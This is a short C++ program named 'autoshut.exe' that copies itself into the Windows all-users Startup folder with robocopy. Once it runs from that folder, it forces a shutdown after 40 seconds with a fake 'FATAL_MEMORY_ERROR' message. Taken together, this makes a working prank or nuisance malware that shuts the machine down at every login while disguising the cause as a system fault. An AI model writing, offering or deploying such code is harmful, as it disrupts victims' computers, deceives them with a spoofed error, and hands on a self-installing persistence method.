
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <iostream>
#include <string>

#define EXECUTABLE_NAME			"autoshut.exe"
#define SOURCE_PATH				"C:\\Users\\nos12\\Desktop\\Autoshut"
#define DESTINY_PATH			"C:\\ProgramData\\Microsoft\\Windows\\StartM~1\\Programs\\StartUp"
#define DESTINY_PATH_VERBAL		"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"
#define ROBOCOPY_OPTIONS		" /COPY:DT /R:0"

using namespace std;

int main(){

	char cwd[1024];

	printf("Autoshut is running!\n");
    fflush(stdout);
    
	getcwd(cwd, sizeof(cwd));
	string path(cwd);
		
	if(strcmp(cwd, DESTINY_PATH_VERBAL) == 0){
		// Correct path
		string com = "shutdown /s /t 40 /c FATAL_MEMORY_ERROR_0x00005F58AD29C654ECBA30673ABEDFC2";
		cout << "Command: " << com << endl;
		system(com.c_str());
		
	}else{
		// Wrong path
		string command = string("robocopy") + " " + path + " " + DESTINY_PATH + " " + EXECUTABLE_NAME + ROBOCOPY_OPTIONS;
		//cout << "Command: " << command.c_str() << endl;
		system(command.c_str());
	}
	
    return 0;  
}



